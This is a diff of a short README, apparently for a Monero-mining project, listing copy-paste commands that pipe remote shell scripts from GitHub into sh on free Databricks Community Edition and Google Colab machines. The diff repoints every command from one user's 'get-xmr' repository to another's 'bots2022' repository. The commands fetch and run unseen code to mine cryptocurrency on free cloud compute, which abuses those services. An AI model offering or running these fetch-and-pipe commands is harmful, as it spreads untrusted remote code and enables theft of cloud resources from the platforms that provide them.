@@ -1,18 +1,18 @@
-# Edit + Copy + Paste 👉🏻 [Click here for Tutorial](https://aank.me/Youtube)
+# Edit + Copy + Paste 👉🏻 [Click here for Tutorial]
 * Try Free [Databricks Community Edition](https://bit.ly/Databr1cks)
 ```markdown
 cd /root
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
+curl https://raw.githubusercontent.com/bdrhuseyin73/bots2022/main/databricks.sh | sh
 ```
 * Try Free [XRDP GColab](https://bit.ly/XRDP-Colab)
 ```markdown
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-sg.sh | sh
+curl https://raw.githubusercontent.com/bdrhuseyin73/bots2022/main/gcolab-sg.sh | sh
 ```
 ```markdown
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/gcolab-us.sh | sh
+curl https://raw.githubusercontent.com/bdrhuseyin73/bots2022/main/gcolab-us.sh | sh
 ```
 ```markdown
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/nvidiacolab-us.sh | sh
+curl https://raw.githubusercontent.com/bdrhuseyin73/bots2022/main/nvidiacolab-us.sh | sh
 ```
 * Try Free [40 CPU GColab to get XMR](https://bit.ly/GC-40cpu)
  
